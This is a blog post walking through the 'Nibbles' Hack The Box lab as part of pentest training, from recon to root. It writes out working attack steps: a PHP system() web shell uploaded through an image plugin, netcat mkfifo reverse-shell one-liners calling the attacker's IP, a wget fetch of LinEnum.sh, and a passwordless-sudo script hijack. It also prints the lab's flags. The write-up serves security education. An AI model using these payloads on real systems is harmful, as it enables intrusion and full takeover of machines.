---
layout: post
title: HTB - Nibbles
media_subpath: "/assets/img/posts/"
image: nibbles-cover.png
categories:
- HTB
- Boxes
tags:
- HTB
- CTF
- kali-linux
- red-team
description: I document going through the beginner HTB box "Nibbles" as part of the
  Penetration Tester Job Path on HTB Academy.
date: 2025-04-24 14:09 -0600
---
Nibbles is the first box that you attack in HTB's Penetration Tester Job Path. It's a
 super easy, beginner-friendly box that helps get a new pentester's feet wet. While it
 was fairly straightforward, it was a fun opportunity to perform some hacks without
 the use of metasploit.

## Information Gathering

The first step is to see what we're dealing with. The only information provided by HTB
 is the OS (Linux) and the IP (10.129.133.238). This lets us know we should try using
 linux tools first and where to hit, but not much more than that. We are also told what
 the scope of the test is (or, in this case, the goal): we need to gain root access and
 capture the flag in the root user directory. With this info in mind, it's time to start
 gathering more information and doing some recon!

### WhatWeb

A good place to start is to see what kind of services the box is running. For that, we
 run `whatweb`:
 
 ```terminal
┌──(zero㉿kali)-[~]
└─$ whatweb 10.129.133.238
http://10.129.133.238 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.133.238]
 ```

It looks like we have an Apache server and an HTTP server running. These sometimes have
 a page at their root, so we attempt to grab that with `curl`:

```terminal
┌──(zero㉿kali)-[~]
└─$ curl https://10.129.133.238
curl: (7) Failed to connect to 10.129.133.238 port 443 after 61 ms: Could not connect to server
```

This fails, but double-checking the URL used, it looks like we used HTTPS! Guess that's 
 what happens when you burn basic security practices into your brain. Trying again with
 HTTP gives us a more hopeful result:
 
```terminal
┌──(zero㉿kali)-[~]
└─$ curl http://10.129.133.238
<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->

```

Doesn't look like much at first, just your generic 'Hello world!' defaults. The comment at
 the bottom looks interesting though; it makes mention of a "/nibbleblog/" directory. This
 is worth looking into. Running `whatweb` on this new path we get:
 
```terminal
┌──(zero㉿kali)-[~]
└─$ whatweb 10.129.133.238/nibbleblog
http://10.129.133.238/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.133.238], RedirectLocation[http://10.129.133.238/nibbleblog/], Title[301 Moved Permanently]
http://10.129.133.238/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.133.238], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]

```

Now this is something we can potentially use! The site shows use of cookies, JQuery, scripts,
 and is powered by the aptly-named "Nibbleblog" tool. Searching this in `exploitdb` gives us
 a couple results:
 
```terminal
┌──(zero㉿kali)-[~]
└─$ searchsploit nibbleblog
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                  | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                   | php/remote/38489.rb
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

An excellent find! We make a note of this and continue with our recon.

### Gobuster

Continuing the recon, we decide to look at the rest of the directories. A great tool for
 this is `gobuster`. This will scan for common web directories for us to target:

```terminal
┌──(zero㉿kali)-[~]
└─$ gobuster dir -u http://10.129.133.238/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.133.238/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 304]
/.htaccess            (Status: 403) [Size: 309]
/.htpasswd            (Status: 403) [Size: 309]
/README               (Status: 200) [Size: 4628]
/admin                (Status: 301) [Size: 327] [--> http://10.129.133.238/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 329] [--> http://10.129.133.238/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 331] [--> http://10.129.133.238/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 329] [--> http://10.129.133.238/nibbleblog/plugins/]
/themes               (Status: 301) [Size: 328] [--> http://10.129.133.238/nibbleblog/themes/]
Progress: 4744 / 4745 (99.98%)
===============================================================
Finished
===============================================================
```

Looks like we have a number of results, the most interesting being:

- /README
- /admin.php
- /index.php
- /nibbleblog/content/
- /nibbleblog/languages/
- /nibbleblog/plugins/
- /nibbleblog/themes/

### Directory Enumeration

Now that we have a number of new, potential targets, let's go through them and see what
 we can find. Let's start with the README:

```terminal
┌──(zero㉿kali)-[~]
└─$ curl 10.129.133.238/nibbleblog/README
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

<SNIP>
```

The file is somewhat large but gives us an important piece of information: the version of
 nibbleblog being ran. The README confirms that we're dealing with nibbleblog v4.0.3.
 This is important to know since the previous exploits we found require specific versions.

Continuing on down our list, we find that the admin page is a login page. Checking the
 source code of the page doesn't yield anything useful (no password leaks in the comments,
 sadly). Trying a few default combos (`admin:admin` and `admin:password1`) doesn't get us
 in either. We'll make a note of this and move on.

Looking at the rest of the list, the content page stands out. Content can often include
 all sorts of personal information, usually shared without realizing it, which can give us
 clues as to what the admin password might be. Checking this page out in FireFox, we find
 a number of sub-directories: `public`, `private`, and `tmp`. The `private` directory sounds
 the most intriguing so we'll start there.

Inside, we find a number of potential files. For starters, we can look at `users.xml` to
 get an idea of what users are available to us. Maybe there's a non-admin we can use to
 escalate from?

```terminal
┌──(zero㉿kali)-[~]
└─$ curl http://10.129.133.238/nibbleblog/content/private/users.xml | xmllint --format -
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1936  100  1936    0     0  15696      0 --:--:-- --:--:-- --:--:-- 15739
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">2</session_fail_count>
    <session_date type="integer">1608182184</session_date>
  </user>
  <blacklist type="string" ip="10.10.14.241">
    <date type="integer">1608182171</date>
    <fail_count type="integer">2</fail_count>
  </blacklist>
</users>
```

Looks like admin is the only user available. Furthermore, looks like our login attempts
 were logged; we'll need to be careful about what we try, and brute forcing is off the
 table. Let's now take a look at the `config.xml` file; maybe it has something good in
 it:

```terminal
┌──(zero㉿kali)-[~]
└─$ curl http://10.129.133.238/nibbleblog/content/private/config.xml | xmllint --format -
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1936  100  1936    0     0  15696      0 --:--:-- --:--:-- --:--:-- 15739
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<config>
  <name type="string">Nibbles</name>
  <slogan type="string">Yum yum</slogan>
  <footer type="string">Powered by Nibbleblog</footer>
  <advanced_post_options type="integer">0</advanced_post_options>
  <url type="string">http://10.10.10.134/nibbleblog/</url>
  <path type="string">/nibbleblog/</path>
  <items_rss type="integer">4</items_rss>
  <items_page type="integer">6</items_page>
  <language type="string">en_US</language>
  <timezone type="string">UTC</timezone>
  <timestamp_format type="string">%d %B, %Y</timestamp_format>
  <locale type="string">en_US</locale>
  <img_resize type="integer">1</img_resize>
  <img_resize_width type="integer">1000</img_resize_width>
  <img_resize_height type="integer">600</img_resize_height>
  <img_resize_quality type="integer">100</img_resize_quality>
  <img_resize_option type="string">auto</img_resize_option>
  <img_thumbnail type="integer">1</img_thumbnail>
  <img_thumbnail_width type="integer">190</img_thumbnail_width>
  <img_thumbnail_height type="integer">190</img_thumbnail_height>
  <img_thumbnail_quality type="integer">100</img_thumbnail_quality>
  <img_thumbnail_option type="string">landscape</img_thumbnail_option>
  <theme type="string">simpler</theme>
  <notification_comments type="integer">1</notification_comments>
  <notification_session_fail type="integer">0</notification_session_fail>
  <notification_session_start type="integer">0</notification_session_start>
  <notification_email_to type="string">admin@nibbles.com</notification_email_to>
  <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
  <seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
  <seo_site_description type="string"/>
  <seo_keywords type="string"/>
  <seo_robots type="string"/>
  <seo_google_code type="string"/>
  <seo_bing_code type="string"/>
  <seo_author type="string"/>
  <friendly_urls type="integer">0</friendly_urls>
  <default_homepage type="integer">0</default_homepage>
</config>
```

What stands out immediately is the admin email `admin@nibbles.com`. This is useful info
 we can try to leverage later. Digging through the rest of the info fails to provide us
 with much else.

So far, we have:

- An admin login page `/nibbleblog/admin.php`
- A confirmed admin username `admin`
- A confirmed admin email `admin@nibbles.com`
- A confirmed exploit for `nibbleblog v4.0.3`
- A confirmed password lockout, preventing brute force methods

### Restructuring Your Thought Process

It's at this point that I admit I needed a bit of insight from HTB. Following the module
 info, it appears we have already found what we need to login. What did we miss?

The clues were all had once we got the config info:

- The site title is `Nibbles`
- The site name is `Nibbles`
- The box name is `Nibbles`
- The admin email is `@nibbles.com`

We can't brute-force the password, but we _can_ try it a number of times before a lockout.
 Plus, it's unlikely we would get permanently locked out no matter how many times we failed
 to login. With nibbles being such a common theme - and even more so, a common, exact term -
 we can give it a go. Trying the site name `Nibbles` fails, but trying it lowercase (`nibbles`)
 leads to a success! We now have access to the admin portal for the blog, an excellent
 step forward that we can use to escalate our access/privileges.

Before moving on, let's look at what happened here. First, why did I not think to use the
 `nibbles` as a password? I think my problem was I thought too much like a security-conscious
 tech user and less like an average user. I've been using password managers since I was in
 high school; I would never use something so simple and straightforward as `nibbles` for my
 admin password! But I'm not the average user - most anyone using HTB probably doesn't qualify
 as an average user! We need to adjust how we view our attack vectors; we have to get into the
 mind of the users we're trying to hack.

This user had a `hello world` index page; their README still had default lorem ipsum in it;
 their `content` directory was entirely unprotected - even the `private` one! It's a good chance
 this user would use the default passwords, or at best use something simple and straightforward
 so they could easily login (and would be easy to type). These factors don't guarantee that
 `nibbles` would be their password, but it does support the idea that it would be worth giving a
 shot. Learning to "forget" what we've learned and act like a totally different user to guess
 credentials and configs of all sorts of different users is vital to the pentesting process; it's
 a skill I look forward to developing more as I continue along this path.

## Exploitation (and More Recon)

Now that we have access to the admin portal, we need to do some more recon. Performing recon
 after new information is obtained is vital; if we push forward without looking into all the
 new info we have access to, we could miss some highly valuable information and fail to test
 portions of the system. While our goal is to get the flag, it's important to treat every box
 as a real customer's machine so we develop proper habits[^habits].

Looking at the portal, we find six main sections:

- Publish
- Comments
- Manage
- Settings
- Themes
- Plugins

Publishing a new page doesn't appear to offer a means of ingress; neither does the Comments
 section. Manage, Settings, and Themes appear less than useful to us as well. The Plugins
 section shows promise, however: the blog is running a plugin called `My image` which allows
 for uploading files.

![nibbleblog plugins tab](nibbles-plugins.png)

If we look at our earlier findings we'll recall that there was a
 confimed exploit for nibbleblog v4.0.3 that allowed for arbitrary file uploads. This could very
 well be our way in!

### Testing Potential Exploits

Before we get too ahead of ourselves, we should confirm that this will work. To do that, we
 create a `PHP` script to upload through the image plugin:

```php
<?php system('id'); ?>
```
{: .nolineno file="image.php" }

We upload this using the plugin:

![nibbles My image plugin](nibbles-my-image.png)

We see a number of errors in the upper-right side of the browser tab, but it otherwise reports
 success! To confirm this, we navigate to the `/content` directory we explored earlier and find
 the `plugins` directory. Here, we see the directory `my_image`, in which we find `image.php`.
 Success! We know that it's ours not just from the filename but from the modified date matching
 the current date. All that's left is to test its execution:

```terminal
┌──(zero㉿kali)-[~]
└─$ curl http://10.129.133.238/nibbleblog/content/private/plugins/my_image/image.php

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Fantastic; the response is the code we scripted! Based on the response, it appears that the
 Apache web server is running under the `nibbler` user on the target machine.

### Gaining A Foothold
Since we've aleady investigated the rest of the admin portal, it's time we attempt to get a
 foothold on the target. We modify our `image.php` script to provide us with a reverse shell
 using a nice bit of script found on the [HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/#:~:text=0/tmp/p-,A%20reverse%20shell,-submitted%20by%20%400xatul) reverse shell resource page:

```php
<?php system("rm /tmp/lol;mkfifo /tmp/lol;nc 10.10.14.241 80 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol"); ?>
```

Before we execute the script, we need to be sure to setup our `netcat` listener first. We
 chose port 80 here because it's a port that most firewalls have open; using an uncommon
 port can trigger alerts, and while it's not likely to do so in this scenario, it's
 [considered a good idea](https://highon.coffee/blog/reverse-shell-cheat-sheet/#:~:text=Set%20your%20Netcat,g.%2080%20/%20443) to use these open ports even in test scenarios.

```terminal
┌──(zero㉿kali)-[~]
└─$ nc -lvnp 80
listening on [any] 80 ...
```
> For this to work on my machine, I had to make sure that my WSL2 kali box could receive
 traffic on the ports I listened on. Luckily, this is something I had encountered a while back
 and already knew how to do this[^wsl2].
{: .prompt-info }

With `netcat` listening, all that was left was to run the script. I decided to load the `PHP`
 script using the browser this time, instead of `curl`, as the script would lead to a long
 hang / load time and I didn't want my terminal having to sit on it. Opening the `image.php`
 file in a new tab, we look at our `netcat` command and see:

```terminal
┌──(zero㉿kali)-[~]
└─$ nc -lnvp 80
listening on [any] 80 ...
connect to [WSL2-IP] from (UNKNOWN) [WSL2-GW] 65348
/bin/sh: 0: can't access tty; job control turned off
$
```

We now check that we can interact with the session and that we're on the expected user...

```terminal
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Success! We have a shell on the target running as the `nibbler` user. We could move forward
 from here, but the current interface is pretty rough: we don't have access to command history,
 we can't move our cursor to correct or change typed commands, we don't know our current
 directory... it's pretty primitive and gross. We can fix that using [this magic trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#:~:text=terminal.%20Pretty%20sweet.-,Method%203%3A%20Upgrading%20from%20netcat%20with%20magic,-I%20watched%20Phineas)
 to give us a fully-functional TTY interface with all the snazzy QoL features we've come to
 love in our linux terminals:

```terminal
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ^Z
[1]+  Stopped                 nc -lnvp 80

┌──(zero㉿kali)-[~]
└─$ echo $TERM
xterm-256color

┌──(zero㉿kali)-[~]
└─$ stty -a
speed 38400 baud; rows 71; columns 122; line = 0;
<SNIP>

┌──(zero㉿kali)-[~]
└─$ stty raw -echo

┌──(zero㉿KALI)-[~]
└─$
nc -lnvp 80
<ml/nibbleblog/content/private/plugins/my_image$ reset
reset: unknown terminal type unknown
Terminal type? xterm-256color

nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler
nibbler@Nibbles:/home/nibbler$ export SHELL=bash
nibbler@Nibbles:/home/nibbler$ export TERM=xterm-256color
nibbler@Nibbles:/home/nibbler$ stty rows 35 columns 122
nibbler@Nibbles:/home/nibbler$
```

_Et voilà!_ We have a beautiful, fully-functional terminal. It truly does feel like magic
 (though most of what happens on a computer feels like magic, and I've studied how it works
 all the way down to the quantum level!).

## More Recon (And More Exploitation)

With our foothold secured, it's time we do some more digging. First thing we should check is
 the home directory for `nibbler`:

```terminal
nibbler@Nibbles:/home/nibbler$ ls -la
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Mar 12  2021 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Mar 12  2021 user.txt
```

Not a lot, but what little there is sure does look interesting. Checking the `user.txt`
 file first, we find our first flag:

```terminal
nibbler@Nibbles:/home/nibbler$ cat user.txt
79c03865431abf47b90ef24b9695e148
```

Excellent! Our first flag is in the bag. It doesn't provide us with any additional insight
 into our environment or any clues on how we can escalate our privilege to `root` though,
 so we need to keep looking.

> While writing up this walkthrough, I noticed that the user had a `.bash_history` file
 which I failed to investigate. Oops! That could have contained leaked passwords used
 in previous commands and would have been a potentially excellent source of info. This
 is one of the many reasons why writing up these walkthroughs, even if no one else is
 reading them, is valuable: we often catch things we missed before and can learn new lessons.
{: .prompt-tip }

The `personal.zip` file is worth checking out. We unzip its contents and dig around to see
 what we can find:

```terminal
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ alias ll="ls -l"
nibbler@Nibbles:/home/nibbler$ cd personal/stuff/
nibbler@Nibbles:/home/nibbler/personal/stuff$ ll
total 4
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

From the `unzip` output we can see that the only thing inside is `/stuff/monitor.sh` so we
 navigate to the file and take a look inside:

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

<SNIP>

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
```
{: .nolineno }

It's a lot of info to parse; we can do a deep dive later, but for now a quick scan doesn't
 show anything popping out as useful. We can come back to that and continue with our recon.

### LinEnum.sh

With our foothold secured and our home directory searched, we could continue to dig through
 every little nook and cranny to find something useful... but that would take a long time.
 It's a good point to start bringing in some automated tools to help speed things up. A
 tool that HTB has recently highlighted in our modules is `LinEnum.sh`; this performs an
 automated checks to look for common potential means on the system that might allow us to
 escalate to `root`.

> It's important that we take the time to understand what these automated tools are doing.
 Simply loading a bunch of random tools we find and running them, hoping that one will work,
 doesn't give us the insight we need to access highly-strengthened boxes, nor does it give
 us the insight necessary to inform our customers _what_ and _why_ they need to fix on their
 systems. Taking the time to understand these tools - and even write or perform their
 functions ourselves - is a crucial aspect of what separates a penetration tester from a
 mere [script kiddie](https://en.wikipedia.org/wiki/Script_kiddie).
{: .prompt-warning }

Often in scenarios like this, targets won't allow us to download a malicius script directly
 from its repository, or might not even allow general internet access. We need a way to
 get around this. Since our machine is able to connect to the target, we know that we can
 transfer data between the two; an easy solution then is to setup an `http` server on our
 machine and use that to download our scripts to the target. Python has a really easy
 method for doing this:

```terminal
┌──(zero㉿KALI)-[~]
└─$ sudo python3 -m http.server 8080
[sudo] password for zero:

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Back on the target, we use `wget` to pull the script down:

```terminal
nibbler@Nibbles:/home/nibbler/personal/stuff$ wget http://10.10.14.241:8080/LinEnum.sh
--2025-04-21 18:26:34--  http://10.10.14.241:8080/LinEnum.sh
Connecting to 10.10.14.241:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

LinEnum.sh                     100%[==================================================>]  45.54K  --.-KB/s    in 0.1s

2025-04-21 18:26:34 (366 KB/s) - 'LinEnum.sh' saved [46631/46631]
```

The `200` code (and the progress bar) shows that we successfully downloaded the script!
 Next we make the script runnable:

```terminal
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x LinEnum.sh
```

And then we kick it off:

```terminal
nibbler@Nibbles:/home/nibbler/personal/stuff$ ./LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Mon Apr 21 18:27:34 EDT 2025


### SYSTEM ##############################################
[-] Kernel information:
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
<SNIP>
```

The script spits out a _lot_ of information. It's good to go through it all to see what
 might be useful. Thankfully, `LinEnum.sh` helps with that by indicating important finds
 with [+] marks (and color, if your terminal is configured for that). We find that the
 `nibbler` user is allowed to run `sudo` without a password:

```terminal
[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
```

Looks like that `monitor.sh` script is going to be very useful! With the ability to run
 the script as `root` via `sudo`, we can create a reverse shell as `root`!

### Escalating Privileges

We can use the code from earlier to generate a reverse shell and add it to the end of the
 `monitor.sh` script[^bak]:

```terminal
nibbler@Nibbles:/home/nibbler/personal/stuff$ cp monitor.sh monitor.sh.bak
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/lol;mkfifo /tmp/lol;nc 10.10.14.241 443 0</tmp/lol | /bin/sh -
i 2>&1 | tee /tmp/lol' | tee -a monitor.sh
rm /tmp/lol;mkfifo /tmp/lol;nc 10.10.14.241 443 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```

> It is important that any modifications made are done so at the **end** of the script.
 Placing them earlier might cause the script to overwrite or otherwise interrupt the
 changes we've made, causing problems down the line.
{: .prompt-warning }

We use `tail` to make sure that the command was added correctly:

```terminal
nibbler@Nibbles:/home/nibbler/personal/stuff$ tail -n 5 monitor.sh
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
rm /tmp/lol;mkfifo /tmp/lol;nc 10.10.14.241 443 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
```

Looks like it's all there! Now, after we make sure to start a new `netcat` session
 listening on our new port (443), we use `sudo` to run the script[^sudo]:

```terminal
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
```

Back on our `netcat` we see a connection has been made. We make sure to check the new user `id`:

```terminal
# id
uid=0(root) gid=0(root) groups=0(root)
```

Another success! All that's left to do is grab the `root.txt` flag:

```terminal
# cat root.txt
de5e5d6619862a8aa5b9b212314e0cdd
```

Flag captured! That's it for this machine, although if this were a real customer, we'd proceed
 to do more recon and see what damage could be done with `root` access on this specific target,
 especially if we were testing a whole corporate network and not just a single machine.

## Wrap-Up

This was a fun box. I really enjoyed getting to manually exploit the vulnerabilities in this.
 As an exercise, I went back and looked at the `metasploit` option provided by the `exploitdb`
 entry. It basically does the same thing that we did here, creating a reverse shell by uploading
 an `image.php` file and executing it. It was _much_ faster, but the experience gained by going
 about this more manually was worth the extra time. HTB has a [great writeup](https://academy.hackthebox.com/module/77/section/854) on it if you want to look into it further.

In the future, I'll be more conscious about looking into more hidden files like `.bash_history`
 to treat this as a real pentest and not just a CTF. I'll also work on shifting my viewpoint to
 better get inside the head of the target user.

Overall, while mostly simple and straightforward, this was a great experience.
<br/>
<br/>
<br/>

---
[^wsl2]: Open a Powershell window (running as admin) and create a port proxy
	and firewall rule as follows:
	```powershell
	netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=80 connectaddress=[WSL2-IP] connectport=80

	netsh advfirewall firewall add rule name="Open Port 80 for WSL2" dir=in action=allow protocol=TCP localport=80
	```

[^habits]: There are some red team exercises where you want to gain access as quickly as
	 possible, but those are unique circumstances and not something we should be applying in
	 general. Being efficient and thorough is far more valuable in real-world situations than
	 completing a single hack quickly.

[^bak]: Notice that the first command here creates a backup of the `monitor.sh` script. We
	 want to be sure that we preserve the environment as much as possible when doing
	 these tests. For one thing, it keeps things clean so we don't disrupt our customers
	 more than we need to while testing; for another, it's quieter and leaves fewer
	 traces behind, which is just good hacking practices. Finally, if we make a mistake,
	 we can easily restore the original script and try again without accidentally causing
	 unwanted damage due to having lost the original script.

[^sudo]: Notice that we have to specify the full path. When trying to use the relative path,
	 the `sudo` rights weren't granted; use the full path so we can `sudo` without a
	 password.
